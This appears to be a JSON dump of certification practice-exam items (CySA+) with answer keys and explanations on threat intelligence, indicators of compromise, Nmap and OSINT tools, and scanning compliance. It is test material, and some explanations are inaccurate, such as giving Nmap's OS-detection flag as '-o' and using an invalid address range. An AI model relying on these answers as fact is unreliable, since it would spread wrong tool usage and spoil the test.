email."],"a":2,"e":"Forwarding an email will remove the headers and replace them with new headers on the forwarded email—but not the original. Laura should use a “view headers” or “view original email” option if it exists to view and analyze the headers. Printing, replying, or downloading an email will not impact the headers.","l":"c3-filesandbox","l2":"c3-cloud-social","k":"Email header preservation"},{"id":"sg3-15","set":"sg","ch":3,"d":1,"q":"Which of the following is a key differentiator between a EDR and XDR?","o":["EDR does not provide a dashboard.","XDR does not provide endpoint detection capabilities.","EDR focuses only on endpoints.","XDR requires EDR to fully function."],"a":2,"e":"EDR tools are designed to monitor and protect endpoints, whereas XDR is designed to work with a broad range of devices and systems including endpoints.","l":"c3-tip-edr","l2":"","k":"EDR vs XDR differentiation"},{"id":"sg3-16","set":"sg","ch":3,"d":1,"q":"Which of the following options is not a valid way to check the status of a service in Windows?","o":["Use <code>sc</code> at the command line.","Use <code>service ––status</code> at the command line.","Use <code>services.msc</code>.","Query service status using PowerShell."],"a":1,"e":"The <code>service --status</code> command is a Linux command. Windows service status can be queried using <code>sc</code>, the Services snap-in for the Microsoft Management Console (MMC), or a PowerShell query.","l":"c3-cloud-social","l2":"c2-os","k":"Windows service status checking"},{"id":"sg3-17","set":"sg","ch":3,"d":1,"q":"Avik has been asked to identify unexpected traffic on her organization’s network. Which of the following is not a technique she should use?","o":["Protocol analysis","Heuristics","Baselining","Beaconing"],"a":3,"e":"Protocol analysis, using heuristic (behavior)-based detection capabilities, and building a network traffic baseline are all common techniques used to identify unexpected network traffic. Beaconing occurs when a system contacts a botnet command and control (C&amp;C) system, and it is likely to be a source of unexpected traffic.","l":"c3-network","l2":"","k":"Unexpected traffic identification techniques"},{"id":"sg3-18","set":"sg","ch":3,"d":1,"q":"Sofia suspects that a system in her datacenter may be sending beaconing traffic to a remote system. Which of the following is not a useful tool to help verify her suspicions?","o":["Flows","A protocol analyzer","SNMP","An IDS or IPS"],"a":2,"e":"SNMP will not typically provide specific information about a system’s network traffic that would allow you to identify outbound connections. Flows, sniffers (protocol analyzers), and an IDS or IPS can all provide a view that would allow the suspect traffic to be captured.","l":"c3-network","l2":"","k":"Detecting C2 beaconing traffic"},{"id":"sg3-19","set":"sg","ch":3,"d":1,"q":"Susan has discovered that one of her organization’s email accounts has been used to send phishing emails. What type of email-related attack is this?","o":["Typosquatting","SPF","DKIM","BEC"],"a":3,"e":"Susan should identify this as BEC, or business email compromise. Typosquatting involves registering a domain or URL that is frequently mis-typed or misspelled. Both SPF and DKIM are used to provide email security. DKIM validates that a domain is associated with a message, whereas SPF lists the servers that are authorized to send from your domain.","l":"c3-cloud-social","l2":"c3-filesandbox","k":"Business email compromise"},{"id":"sg3-20","set":"sg","ch":3,"d":1,"q":"Juan has observed an attacker leveraging PowerShell tools to help with their exploits. What type of anomalous activity is this?","o":["Rogue processes","LOLBins","Data exfiltration","Service disruption"],"a":1,"e":"This is an example of using built-in tools as part of an attack known as LOLBins, or living off the land binaries. There is not a rogue process specifically described, no data is described as having left the system, and no services are disrupted.","l":"c3-host","l2":"","k":"LOLBins PowerShell usage"},{"id":"sg4-1","set":"sg","ch":4,"d":1,"q":"Which of the following measures is not commonly used to assess threat intelligence?","o":["Timeliness","Detail","Accuracy","Relevance"],"a":1,"e":"While higher levels of detail can be useful, it isn’t a common measure used to assess threat intelligence. Instead, the timeliness, accuracy, and relevance of the information are considered critical to determining whether you should use the threat information.","l":"c4-collect","l2":"","k":"threat intelligence quality measures"},{"id":"sg4-2","set":"sg","ch":4,"d":1,"q":"Nandita has encountered an attacker who appears to be using a commonly available exploit package to attack her organization. The package seems to have been run with default configurations against her entire public-facing Internet presence from a single system. What type of threat actor is she most likely facing?","o":["An APT","A hacktivist","A script kiddie","A nation-state actor"],"a":2,"e":"The lack of complexity and nuance most likely indicates that she has discovered an attack by a script kiddie. Advanced persistent threats or APTs are highly skilled, well resourced, and often nation-state sponsored or aligned threats that tend to undertake long-term, stealthy cyberattacks intended to maintain access while stealing data. Hacktivists are activists who use hacking as a means to a political or philosophical end. Nation-state actors are often associated with APT organizations, and they have advanced tools and capabilities not commonly seen in the hands of other threat actors.","l":"c4-classify","l2":"","k":"threat actor types"},{"id":"sg4-3","set":"sg","ch":4,"d":1,"q":"Which of the following activities follows threat data analysis in the threat intelligence cycle?","o":["Gathering feedback","Threat data collection","Threat data review","Threat intelligence dissemination"],"a":3,"e":"Threat intelligence dissemination or sharing typically follows threat data analysis. The goal is to get the threat data into the hands of the organizations and individuals who need it.","l":"c4-collect","l2":"","k":"threat intelligence cycle"},{"id":"sg4-4","set":"sg","ch":4,"d":1,"q":"Susan wants to start performing threat intelligence gathering. Which of the following options is frequently conducted in the requirements gathering stage?","o":["Review of security breaches or compromises your organization has faced","Review of current vulnerability scans","Review of current data handling standards","Review of threat intelligence feeds for new threats"],"a":0,"e":"Understanding what your organization needs is important for the requirements gathering phase of the intelligence cycle. Reviewing recent breaches and compromises can help to define what threats you are currently facing. Current vulnerability scans can identify where you may be vulnerable but are less useful for threat identification. Data handling standards do not provide threat information, and intelligence feed reviews list new threats, but those are useful only if you know what type of threats you’re likely to face so that you can determine which ones you should target.","l":"c4-collect","l2":"","k":"threat intelligence requirements gathering"},{"id":"sg4-5","set":"sg","ch":4,"d":1,"q":"An IP address is what type of IoC?","o":["Atomic","Diatomic","Behavioral","Systematic"],"a":0,"e":"Atomic IoCs cannot be broken in to smaller parts and include things like IP addresses, domain names, file hashes and file names, and email addresses. Behavioral IoCs look at patterns of behavior, and an IP address is not a behavior, but might be included in a more complex behavior pattern. Diatomic and systematic are not terms used to describe IoCs.","l":"c4-hunt","l2":"","k":"atomic indicators of compromise"},{"id":"sg4-6","set":"sg","ch":4,"d":1,"q":"Marco’s organization uses the MITRE ATT&amp;CK framework as part of their threat modeling efforts. They’re concerned about input injection attacks using malicious USB drives and see that the ATT&amp;CK framework includes detections that are most commonly associated with that type of attack. Which of the following is not a detection Marco can expect to see associated with this threat?","o":["SQL injection","Process execution when volumes are mounted","Log file entries","Script execution events"],"a":0,"e":"Marco knows that processes that run when a drive is inserted, log files that show scripts and processes running, and scripts running on systems that don’t typically run scripts are all useful indicators of this type of attack. SQL injection is associated with web application attacks.","l":"c4-classify","l2":"","k":"MITRE ATT&CK detections"},{"id":"sg4-7","set":"sg","ch":4,"d":1,"q":"Reese is analyzing an online banking application using the STRIDE model. She is concerned about interception and what attackers could do if they could change values in banking transactions as it transits the network. What STRIDE element should she list this concern under?","o":["Spoofing identity","Information disclosure","Tampering with data","Repudiation"],"a":2,"e":"Reese should match her concerns about data being modified with the tampering with data, or T element of STRIDE. That modification might then lead to repudiation of the messages when they were found to not be intact, and of course the possibility of modification likely means the messages are not encrypted and could result in information disclosure. Her concern, however, is the tampering! Spoofing identity isn’t a direct concern in this scenario.","l":"c4-classify","l2":"","k":"STRIDE threat modeling"},{"id":"sg4-8","set":"sg","ch":4,"d":1,"q":"Jason gathers threat intelligence that tells him that an adversary his organization considers a threat likes to use USB key drops to compromise their targets. What is this an example of?","o":["His organization’s attack surface","A possible attack vector","An example of adversary capability","A probability assessment"],"a":1,"e":"Attack vectors, or the means by which an attacker can gain access to their target, can include things like USB key drops. You may be tempted to answer this question with adversary capability, but remember the definition: the resources, intent, or ability of the likely threat actor. Capability here doesn’t mean what they can do but their ability to do so. The attack surface might include the organization’s parking lot in this example, but this is not an example of an attack surface, and there was no probability assessment included in this problem.","l":"c4-classify","l2":"","k":"attack vector vs capability"},{"id":"sg4-9","set":"sg","ch":4,"d":1,"q":"What type of assessment is particularly useful for identifying insider threats?","o":["Behavioral","Instinctual","Habitual","IoCs"],"a":0,"e":"Behavioral assessments are very useful when you are attempting to identify insider threats. Since insider threats are often hard to distinguish from normal behavior context of the actions performed, such as after-hours logins, misuse of credentials, and logins from abnormal locations or in abnormal patterns, other behavioral indicators are often used.","l":"c4-classify","l2":"c3-uba-scripting","k":"behavioral insider threat assessment"},{"id":"sg4-10","set":"sg","ch":4,"d":1,"q":"Felix wants to gather threat intelligence about an organized crime threat actor. Where is he most likely to find information published by the threat actor?","o":["Social media","Blogs","Government bulletins","The dark web"],"a":3,"e":"Threat actors like criminal organizations frequently operate via the dark web. Forums operate as clearinghouses for information, resources, and access via TOR-hosted sites. While social media, blogs, or government bulletins may provide information about a criminal organization, more likely to publish information themselves on the dark web.","l":"c4-collect","l2":"c4-classify","k":"dark web threat intelligence"},{"id":"sg4-11","set":"sg","ch":4,"d":1,"q":"Which of the following is not a common indicator of compromise?","o":["Administrative account logins","Unexpected modifications of configuration files","Login activity from atypical countries or locations","Large outbound data transfers from administrative systems"],"a":0,"e":"Administrative logins themselves are not IoCs, but unexpected behavior associated with them or other atypical behavior is an indicator of compromise. Unexpected modifications of configuration files, login activity from atypical countries or locations, and large file transfers from administrative systems are all common indicators of compromise.","l":"c4-hunt","l2":"","k":"indicators of compromise"},{"id":"sg4-12","set":"sg","ch":4,"d":1,"q":"Nick wants to use a cyber deception tool that can provide him with opportunities to analyze attacker tactics and techniques. What type of tool can he deploy to most effectively capture actual attack data for analysis?","o":["A firewall","A honeypot","A web application firewall","A SIEM"],"a":1,"e":"Nick should deploy a honeypot to capture attack tools and techniques for further analysis. Firewalls block traffic. A web application firewall is a firewall designed to protect web applications, and while it may capture useful information, it is not as well suited to this purpose. A SIEM, or security information and event management tool, may also capture relevant attack data but it’s not specifically designed for the purpose like a honeypot is.","l":"c4-hunt","l2":"","k":"honeypot cyber deception"},{"id":"sg4-13","set":"sg","ch":4,"d":1,"q":"Which of the following is not a common focus area for threat hunting activities?","o":["Policies","Misconfigurations","Isolated networks","Business-critical assets"],"a":0,"e":"Threat hunters are less likely look at policies. Instead, configurations and misconfigurations, isolated networks, and business-critical assets are all common focuses of threat hunters.","l":"c4-hunt","l2":"","k":"threat hunting focus areas"},{"id":"sg4-14","set":"sg","ch":4,"d":1,"q":"What term describes an analysis of threat information that might include details such as whether it is confirmed by multiple independent sources or has been directly confirmed?","o":["Threat quality level","STIX level","Confidence level","Assurance level"],"a":2,"e":"The confidence level of your threat information is how certain you are of the information. A high confidence threat assessment will typically be confirmed either by multiple independent and reliable sources or via direct verification.","l":"c4-collect","l2":"","k":"threat intelligence confidence level"},{"id":"sg4-15","set":"sg","ch":4,"d":1,"q":"Which of the following items on the pyramid of pain will create the most pain for a threat actor if it isn’t available to them?","o":["IP addresses","Host artifacts","Domain names","Tools"],"a":3,"e":"The pyramid of pain lists the most painful item as TTPs, then tools, followed by host and network artifacts, domain names, IP addresses, and finally hash values.","l":"c4-classify","l2":"","k":"Pyramid of Pain"},{"id":"sg4-16","set":"sg","ch":4,"d":1,"q":"How is threat intelligence sharing most frequently used for vulnerability management?","o":["To identify zero-day threats before they are released","As part of vulnerability feeds for scanning systems","As part of patch management processes to determine which patches are not installed","To perform quantitative risk assessment"],"a":1,"e":"Threat intelligence feeds often provide information about what vulnerabilities are being actively exploited as well as about new exploits. This can influence patching priorities and vulnerability management efforts. Zero-day threats aren’t known until they are released. Vulnerability management efforts help to determine what patches aren’t installed, but threat intelligence doesn’t determine that. Threat intelligence isn’t directly leveraged for qualitative risk assessment as part of vulnerability management efforts in typical organizations.","l":"c4-collect","l2":"c6-config","k":"threat intelligence feeds in vulnerability management"},{"id":"sg4-17","set":"sg","ch":4,"d":1,"q":"Ava builds a chart that displays commonly used TTPs for her organization and uses colors to indicate the most frequently used techniques and procedures. What type of tool has she created?","o":["A heat map","A threat model","A pyramid of pain","A threat map"],"a":0,"e":"Heat maps display information like commonly used TTPs and rely on color coding to indicate frequency. Threat models like MITRE’s ATT&amp;CK are used identify and analyze potential security threats rather than showing how often they are occurring. The pyramid of pain describes the amount of challenge or pain attackers face when resources they rely on are removed or denied. Threat maps are used to map threats to vulnerabilities and assets.","l":"c4-classify","l2":"","k":"TTP heat map"},{"id":"sg4-18","set":"sg","ch":4,"d":1,"q":"Advanced persistent threats are most commonly associated with which type of threat actor?","o":["Insider threats","Nation-state actors","Organized crime","Hacktivists"],"a":1,"e":"Advanced persistent threats (APTs) are most commonly associated with nation-state actors. The complexity of their operations and the advanced tools that they bring typically require significant resources to leverage fully.","l":"c4-classify","l2":"","k":"advanced persistent threat actors"},{"id":"sg4-19","set":"sg","ch":4,"d":1,"q":"What are the two types of insider threats?","o":["Attack and defense","Approved and prohibited","Real and imagined","Intentional and unintentional"],"a":3,"e":"Insider threats may be intentional or unintentional.","l":"c4-classify","l2":"","k":"insider threat types"},{"id":"sg4-20","set":"sg","ch":4,"d":1,"q":"Forensic data is most often used for what type of threat assessment data?","o":["STIX","Behavioral","IoCs","TAXII"],"a":2,"e":"Forensic data is very helpful when defining indicators of compromise (IoCs). Behavioral threat assessments can also be partially defined by forensic data, but the key here is where the data is most frequently used.","l":"c4-hunt","l2":"c10-analysis","k":"forensic data for IoCs"},{"id":"sg5-1","set":"sg","ch":5,"d":2,"q":"Megan wants to use the Metasploit Framework to conduct a web application vulnerability scan. Which of the following modules is best suited to her needs?","o":["smb_login","Angry IP","Nmap","wmap"],"a":3,"e":"The wmap scanner is a web application scanner module for the Metasploit Framework that can scan for vulnerable web applications. The smb_login tool looks for SMB shares, not web applications. Angry IP Scanner is not integrated with Metasploit, and Nmap is a port scanner, not a full web application vulnerability scanner.","l":"c5-portscan","l2":"c6-tools","k":"Metasploit wmap web scanner"},{"id":"sg5-2","set":"sg","ch":5,"d":2,"q":"What flag does Nmap use to enable operating system identification?","o":["<code> –os</code>","<code> –id</code>","<code> –o</code>","<code> –osscan</code>"],"a":2,"e":"Nmap’s operating system identification flag is <code>–o</code>, and it enables OS detection. <code>–A</code> also enables OS identification and other features. <code>–osscan</code> with modifiers like <code>–limit</code> and –<code>guess</code> sets specific OS identification features. <code>–os</code> and <code>–id</code> are not Nmap flags.","l":"c5-portscan","l2":"","k":"Nmap OS identification flag"},{"id":"sg5-3","set":"sg","ch":5,"d":2,"q":"What command-line tool can be used to determine the path that traffic takes to a remote system?","o":["<code>whois</code>","<code>traceroute</code>","<code>nslookup</code>","<code>routeview</code>"],"a":1,"e":"<code>traceroute</code> (or <code>tracert</code> on Windows systems) is a command-line tool that uses ICMP to trace the route that a packet takes to a host. <code>whois</code> and <code>nslookup</code> are domain tools, and routeview is not a command-line tool.","l":"c5-recon","l2":"","k":"traceroute network path discovery"},{"id":"sg5-4","set":"sg","ch":5,"d":2,"q":"Valerie wants to use a graphical interface to control Nmap and wants to display her scans as a visual map to help her understand her target networks. Which of the following tools should she use?","o":["Angry IP Scanner","Wmap","Zenmap","<code>nmap-gs</code>"],"a":2,"e":"Zenmap is a graphical user interface for Nmap that also supports graphical output, including visual maps of networks. Valerie can use Zenmap to control Nmap and create the output she wants. Angry IP Scanner is a separate scanner and does not generate a visual map of networks—instead, it provides lists. wmap is a plug-in for the Metasploit Framework and a stand-alone tool that is a web application and service vulnerability testing tool, and <code>nmap-gs</code> was made up for this question.","l":"c5-portscan","l2":"c5-recon","k":"Zenmap graphical network interface"},{"id":"sg5-5","set":"sg","ch":5,"d":2,"q":"Susan runs an Nmap scan using the following command:\n<p><code>nmap -o -Pn 192.168.1.0/255</code></p>\n<p>What information will she see about the hosts she scans?</p>","o":["The hostname and service ports","The hostname, service ports, and operating system","The hostname and operating system","The hostname, uptime, and logged-in user"],"a":1,"e":"Along with the time to run the scan and time to live of packets sent, Susan will see the hostname, service ports, and operating system using the scan flags shown. The <code>-o</code> flag attempts to identify the operating system, while the <code><i>-Pn</i></code> flag skips pinging and scans all hosts in the network on their typically scanned ports.","l":"c5-portscan","l2":"","k":"Nmap scan output analysis"},{"id":"sg5-6","set":"sg","ch":5,"d":2,"q":"Tuan wants to gather additional information about a domain that he has entered in Maltego. What functionality is used to perform server-based actions in Maltego?","o":["A worker","A query","A transform","A scan"],"a":2,"e":"Maltego calls its server-based functions for information gathering “transforms.”","l":"c5-portscan","l2":"c4-collect","k":"Maltego data collection transforms"},{"id":"sg5-7","set":"sg","ch":5,"d":2,"q":"Laura wants to conduct a search for hosts using Recon-ng but wants to leverage a search engine with API access to acquire existing data. What module should she use?","o":["<code>recon/companies-multi/whois_miner</code>","<code>import/nmap</code>","<code>recon/domains-hosts/shodan_hostname</code>","<code>import/list</code>"],"a":2,"e":"While you may not know the full list of Recon-ng plug-ins, Shodan is a well-known search engine. Laura could leverage API access to Shodan to gather information from previously performed searches. Both the import utilities will require her to have data she has already gathered, and the whois miner can be assumed to use whois information rather than an existing search engine dataset.","l":"c5-portscan","l2":"c4-collect","k":"Recon-ng Shodan search integration"},{"id":"sg5-8","set":"sg","ch":5,"d":2,"q":"After running an Nmap scan, Geoff sees ports 80 and 443 open on a system he scanned. What reasonable guess can he make about the system based on this result?","o":["The system is a Windows system.","The system is running a database server.","The system is a Linux system.","The system is running a web server."],"a":3,"e":"Ports 80 and 443 are commonly associated with unencrypted (port 80) and TLS-encrypted (port 443) web servers. There is not enough information to determine if this might be a Windows or Linux system, and these are not typical ports for a database server.","l":"c5-portscan","l2":"","k":"standard web service ports"},{"id":"sg5-9","set":"sg","ch":5,"d":2,"q":"What information is used to identify network segments and topology when conducting a map scan?","o":["IP addresses","Hostnames","Time to live","Port numbers"],"a":2,"e":"The time to live (TTL) provided as part of responses is used to evaluate the number of hops in a network and thus to derive a best guess at network topology. While IP addresses can sometimes be related to network topology, they’re less likely to be directly associated with it. Hostnames and port numbers have no correlation to topology.","l":"c5-recon","l2":"","k":"TTL hop count topology"},{"id":"sg5-10","set":"sg","ch":5,"d":2,"q":"Murali wants to scan a network using Nmap and has run a scan without any flags without discovering all of the hosts that he thinks should show. What scan flag can he use to scan without performing host discovery that will also determine if services are open on the systems?","o":["<code>-sn</code>","<code>-PS</code>","<code>-Pn</code>","<code>-sL</code>"],"a":2,"e":"The <code>-Pn</code>, or “no ping,” flag skips host discovery and performs a port scan. The <code>-sn</code> flag skips the port scan after discovery, <code>sL</code> lists hosts by performing DNS lookups, and <code>-PS</code> performs probes using a TCP SYN.","l":"c5-portscan","l2":"c5-recon","k":"Nmap -Pn no-ping flag"},{"id":"sg5-11","set":"sg","ch":5,"d":2,"q":"Jaime is using the Angry IP Scanner and notices that it supports multiple types of pings to identify hosts. Why might she choose to use a specific type of ping over others?","o":["To bypass firewalls","To allow better vulnerability detection","To prevent detection by security software","To leverage the faster speed of TCP pings over UDP pings"],"a":0,"e":"Some firewalls block ICMP ping but allow UDP or TCP pings. Jaime knows that choosing her ping protocol can help to bypass some firewalls. Angry IP Scanner is not a vulnerability scanner, and UDP pings are faster than TCP pings.","l":"c5-recon","l2":"c5-portscan","k":"firewall ping bypass techniques"},{"id":"sg5-12","set":"sg","ch":5,"d":2,"q":"Hue wants to gather OSINT as part of a reconnaissance effort. Which of the following tools is best suited to passively reviewing OSINT given a domain name as the starting point for her efforts?","o":["Traceroute","Maltego","Nmap","Angry IP Scanner"],"a":1,"e":"Hue knows that Maltego provides transforms that can identify hosts and IP addresses related to a domain and that it can then gather additional information using other OSINT transforms. Nmap and Angry IP Scanner are both active scanning tools, and traceroute won’t provide useful footprinting information given just a domain name.","l":"c5-portscan","l2":"c4-collect","k":"Maltego OSINT domain reconnaissance"},{"id":"sg5-13","set":"sg","ch":5,"d":2,"q":"Jack wants to scan a system using the Angry IP Scanner. What information does he need to run the scan?","o":["The system’s IP address","The system’s Whois data","The system’s MAC address","The system administrator’s username and password"],"a":0,"e":"To conduct a port scan, all Jack needs is an IP address, hostname, or IP range.","l":"c5-portscan","l2":"","k":"Angry IP Scanner targets"},{"id":"sg5-14","set":"sg","ch":5,"d":2,"q":"Which of the following is not a reason that security professionals often perform packet capture while conducting port and vulnerability scanning?","o":["Work process documentation","To capture additional data for analysis","To prevent external attacks","To provide a timeline"],"a":2,"e":"A packet capture can’t prevent external attacks, although it might capture evidence of one. Packet capture is often used to document work, including the time that a given scan or process occurred, and it can also be used to provide additional data for further analysis.","l":"c5-portscan","l2":"c3-tools","k":"packet capture during scanning"},{"id":"sg5-15","set":"sg","ch":5,"d":2,"q":"What process uses information such as the way that a system’s TCP stack responds to queries, what TCP options it supports, and the initial window size it uses?","o":["Service identification","Fuzzing","Application scanning","OS detection"],"a":3,"e":"Operating system detection often uses TCP options support, IP ID sampling, and window size checks, as well as other indicators that create unique fingerprints for various operating systems. Service identification often leverages banners since TCP capabilities are not unique to a given service. Fuzzing is a code testing method, and application scanning is usually related to web application security.","l":"c5-portscan","l2":"","k":"TCP stack OS fingerprinting"},{"id":"sg5-16","set":"sg","ch":5,"d":2,"q":"Li wants to use Recon-ng to gather data from systems. Which of the following is not a common use for Recon-ng?","o":["Conducting vulnerability scans of services","Looking for sensitive files","Conducting OSINT gathering of Whois, DNS, and similar data","Finding target IP addresses"],"a":0,"e":"Recon-ng is not a vulnerability scanner. It does help with OSINT activities like looking for sensitive files, conducting OSINT information gathering, and finding target IP addresses. Li knows that Recon-ng is an OSINT-focused tool and that vulnerability scanning is an active, rather than passive, information-gathering effort. While Recon-ng supports port scanning, it does not have a vulnerability scanner function.","l":"c5-portscan","l2":"","k":"Recon-ng OSINT framework capabilities"},{"id":"sg5-17","set":"sg","ch":5,"d":2,"q":"Jason wants to conduct a broad port scan and wants to do so quickly. Which of the following tools is specifically built for rapid, asynchronous port scanning?","o":["Angry IP Scanner","Recon-ng","Masscan","Nmap"],"a":2,"e":"Masscan is specifically built for rapid, asynchronous port scans at scale. Angry IP Scanner and Nmap are fast but are not designed and optimized for the same scale of rapid scanning. Recon-ng is an open source reconnaissance framework.","l":"c5-portscan","l2":"","k":"Masscan asynchronous port scanning"},{"id":"sg5-18","set":"sg","ch":5,"d":2,"q":"Sally wants to use operating system identification using Nmap to determine what OS a device is running. Which of the following is not a datapoint used by Nmap to identify operating systems?","o":["TCP sequences","TCP timestamps","TCP OS header","TCP options"],"a":2,"e":"Operating system fingerprinting relies in many cases on knowing what the TCP stack for a given operating system does when it sends responses. You can read more detail about the many ways Nmap tests for and filters the data at <code><a href=\"https://nmap.org/book/osdetect-methods.html#osdetect-probes\" rel=\"noopener\" target=\"_blank\">https://nmap.org/book/osdetect-methods.html#osdetect-probes</a></code>. Sally knows that banners are provided at interactive logins or by services and that Nmap uses network protocol data for OS detection.","l":"c5-portscan","l2":"","k":"Nmap OS detection metrics"},{"id":"sg5-19","set":"sg","ch":5,"d":2,"q":"Chris wants to perform network-based asset discovery. What limitation will he encounter if he relies on a port scanner to perform his discovery?","o":["Port scanners cannot detect vulnerabilities.","Port scanners cannot determine what services are running on a given port.","Firewalls can prevent port scanners from detecting systems.","A port scanner can create a denial-of-service condition for many modern systems."],"a":2,"e":"Firewalls can prevent responses to port scanners, making systems essentially invisible to the scanner. A port scanner alone is not sufficient for asset discovery in many networks. Port scanners often have some limited vulnerability detection built in, often relying on version information or fingerprinting, but not detecting vulnerabilities does not prevent discovery. Port scanners make a best guess at services on a port based on information provided by the service. Port scanners do not typically cause problems for most modern applications and services but can under some circumstances. This shouldn’t stop a discovery port scan, though!","l":"c5-portscan","l2":"","k":"port scanning asset limitations"},{"id":"sg5-20","set":"sg","ch":5,"d":2,"q":"Emily wants to gather open source intelligence and centralize it using an open source tool. Which of the following tools is best suited to managing the collection of data for her OSINT efforts?","o":["The Metasploit Framework","Recon-ng","Nmap","Angry IP Scanner"],"a":1,"e":"Recon-ng is a Python-based open source framework for open source intelligence gathering and web-based reconnaissance. The Metasploit Framework is a penetration testing and compromise tool with a multitude of other features, but it is not as well suited to information gathering as a core purpose. Nmap and the Angry IP Scanner are both port scanners.","l":"c5-portscan","l2":"c4-collect","k":"Recon-ng intelligence framework"},{"id":"sg6-1","set":"sg","ch":6,"d":2,"q":"What federal law requires the use of vulnerability scanning on information systems operated by federal government agencies?","o":["HIPAA","GLBA","FISMA","FERPA"],"a":2,"e":"The Federal Information Security Modernization Act (FISMA) requires that federal agencies implement vulnerability management programs for federal information systems. The Health Insurance Portability and Accountability Act (HIPAA) regulates the ways that healthcare providers, insurance companies, and their business associates handle protected health (PHI) information. Similarly, the Gramm–Leach–Bliley Act (GLBA) governs how financial institutions handle customer financial records. The Family Educational Rights and Privacy Act (FERPA), which is not covered in this chapter or on the CySA+ exam, allows parents to access their children’s educational records.","l":"c6-requirements","l2":"","k":"FISMA vulnerability scanning mandate"},{"id":"sg6-2","set":"sg","ch":6,"d":2,"q":"Which one of the following industry standards describes a standard approach for setting up an information security management system?","o":["PCI DSS","CIS","ISO 27002","ISO 27001"],"a":3,"e":"ISO 27001 describes a standard approach for setting up an information security management system, while ISO 27002 goes into more detail on the specifics of information security controls. The Payment Card Industry Data Security Standard (PCI DSS) provides security regulations for the handling of credit and debit card information. The Center for Internet Security (CIS) produces a set of configuration benchmarks used to securely configure operating systems, applications, and devices.","l":"c6-requirements","l2":"c8-governance","k":"ISO 27001 ISMS standard"},{"id":"sg6-3","set":"sg","ch":6,"d":2,"q":"What tool can administrators use to help identify the systems present on a network prior to conducting vulnerability scans?","o":["Asset inventory","Web application assessment","Router","DLP"],"a":0,"e":"An asset inventory supplements automated tools with other information to detect systems present on a network. The asset inventory provides critical information for vulnerability scans. A web application assessment focuses only on testing the security of web applications, not mapping the entire network. A router directs traffic between networks but does not catalog or identify all connected systems. A DLP solution protects sensitive data from being leaked but has no function in discovering network assets.","l":"c6-requirements","l2":"c5-portscan","k":"asset inventory scan targets"},{"id":"sg6-4","set":"sg","ch":6,"d":2,"q":"Tonya is configuring vulnerability scans for a system that is subject to the PCI DSS compliance standard. What is the minimum frequency with which she must conduct scans?","o":["Daily","Weekly","Monthly","Quarterly"],"a":3,"e":"PCI DSS requires that organizations conduct vulnerability scans on at least a quarterly basis, although many organizations choose to conduct scans on a much more frequent basis.","l":"c6-requirements","l2":"","k":"PCI DSS scan frequency"},{"id":"sg6-5","set":"sg","ch":6,"d":2,"q":"Which one of the following is not an example of a vulnerability scanning tool?","o":["Nikto","Snort","Nessus","OpenVAS"],"a":1,"e":"Nessus and OpenVAS are network vulnerability scanning tools, while Nikto is a web application vulnerability scanner. Snort is an intrusion detection system.","l":"c6-tools","l2":"c3-tools","k":"vulnerability scanning tools"},{"id":"sg6-6","set":"sg","ch":6,"d":2,"q":"Bethany is the vulnerability management specialist for a large retail organization. She completed her last PCI DSS compliance scan in March. In April, the organization upgraded their point-of-sale system, and Bethany is preparing to conduct new scans. When must she complete the new scan?","o":["Immediately","June","December","No scans are required."],"a":0,"e":"PCI DSS requires that organizations conduct vulnerability scans quarterly, which would have Bethany’s next regularly scheduled scan scheduled for June. However, the standard also requires scanning after any significant change in the payment card environment. This would include an upgrade to the point-of-sale system, so Bethany must complete a new compliance scan immediately.","l":"c6-requirements","l2":"","k":"PCI DSS upgrade scanning"},{"id":"sg6-7","set":"sg","ch":6,"d":2,"q":"Renee is searching for a breach attack simulation (BAS) tool for use in her organization. Which one of the following tools would best meet her needs?","o":["ScoutSuite","ZAP","Nuclei","Atomic Red Team"],"a":3,"e":"Atomic Red Team is the only breach attack simulation (BAS) tool listed here. ScoutSuite is a cloud infrastructure assessment tool. ZAP is a web interception proxy. Nuclei is a vulnerability scanner.","l":"c6-tools","l2":"","k":"breach and attack simulation"},{"id":"sg6-8","set":"sg","ch":6,"d":2,"q":"Jason is writing a report about a potential security vulnerability in a software product and wants to use standardized product names to ensure that other security analysts understand the report. What tool can Jason turn to for assistance?","o":["CVSS","CVE","CPE","OVAL"],"a":2,"e":"Common Platform Enumeration (CPE) is an SCAP component that provides standardized nomenclature for product names and versions. CVSS provides a standardized approach for measuring and describing the severity of security-related software flaws. CVE provides a standard nomenclature for describing security-related software flaws. OVAL is a language for specifying low-level testing procedures used by checklists.","l":"c6-config","l2":"","k":"Common Platform Enumeration"},{"id":"sg6-9","set":"sg","ch":6,"d":2,"q":"Bill would like to run an internal vulnerability scan on a system for PCI DSS compliance purposes. Who is authorized to complete one of these scans?","o":["Any employee of the organization","An approved scanning vendor","A PCI DSS service provider","Any qualified individual"],"a":3,"e":"Internal scans completed for PCI DSS compliance purposes may be conducted by any qualified individual.","l":"c6-requirements","l2":"","k":"PCI DSS internal scanning"},{"id":"sg6-10","set":"sg","ch":6,"d":2,"q":"Which type of organization is the most likely to face a statutory requirement to conduct vulnerability scans?","o":["Bank","Hospital","Government agency","Doctor’s office"],"a":2,"e":"The Federal Information Security Modernization Act (FISMA) requires that government agencies conduct vulnerability scans. HIPAA, which governs hospitals and doctors’ offices, does not include a vulnerability scanning requirement, nor does GLBA, which covers financial institutions. Banks may be required to conduct scans under PCI DSS, but this is a contractual obligation and not a statutory requirement.","l":"c6-requirements","l2":"","k":"statutory scanning requirements"},{"id":"sg6-11","set":"sg","ch":6,"d":2,"q":"Shahla’s organization is preparing to put an AWS CloudFormation script into production as part of their infrastructure as code (IaC) initiative. She would like to analyze the code for security issues prior to deploying it. What tool would best assist her with this work?","o":["Trivy","Checkov","Prowler","ScoutSuite"],"a":1,"e":"Checkov is specifically designed to statically analyze infrastructure as code files such as AWS CloudFormation, Terraform, and Kubernetes manifests to detect security and compliance issues before deployment, which matches Shahla’s need. Trivy focuses on scanning containers, dependencies, and IaC but is broader and not as specialized in deep IaC policy checks. Prowler and ScoutSuite are cloud security auditing tools that assess live AWS environments for misconfigurations and compliance but do not analyze IaC templates before deployment.","l":"c6-tools","l2":"c8-appsec","k":"Checkov IaC scanning"},{"id":"sg6-12","set":"sg","ch":6,"d":2,"q":"What term describes an organization’s willingness to tolerate risk in their computing environment?","o":["Risk landscape","Risk appetite","Risk level","Risk adaptation"],"a":1,"e":"The organization’s risk appetite is its willingness to tolerate risk within the environment. If an organization is extremely risk averse, it may choose to conduct scans more frequently to minimize the amount of time between when a vulnerability comes into existence and when it is detected by a scan.","l":"c6-requirements","l2":"c8-analyzing","k":"organizational risk appetite"},{"id":"sg6-13","set":"sg","ch":6,"d":2,"q":"Which one of the following factors is least likely to impact 